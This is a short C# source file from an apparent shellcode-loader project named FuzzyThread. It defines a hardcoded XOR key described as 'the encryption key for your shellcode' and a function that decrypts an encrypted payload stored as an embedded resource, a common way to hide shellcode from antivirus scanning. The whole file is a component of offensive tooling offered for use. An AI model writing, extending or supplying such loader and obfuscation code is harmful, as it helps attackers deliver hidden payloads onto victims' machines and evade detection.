using System;

namespace FuzzyThread
{
    class Headers
    {
        // This is the encryption key for your shellcode
        public static char[] cryptor = new char[] { 'D', '0', '0', 'm', 'f', 'i', 's', 't','\0' };

        #region Helper Functions

        public static byte[] GetAllDecryptedBytes()
        {
            // You'll need to ensure you have the encrypted shellcode
            // added as an embedded resource.
            byte[] rawData = Properties.Resources.encrypted;
            byte[] result = new byte[rawData.Length];
            int j = 0;

            for (int i = 0; i < rawData.Length; i++)
            {
                if (j == cryptor.Length - 1)
                {
                    j = 0;
                }
                byte res = (byte)(rawData[i] ^ Convert.ToByte(cryptor[j]));
                result[i] = res;
                j += 1;
            }
            return result;
        }

        #endregion
    }
}
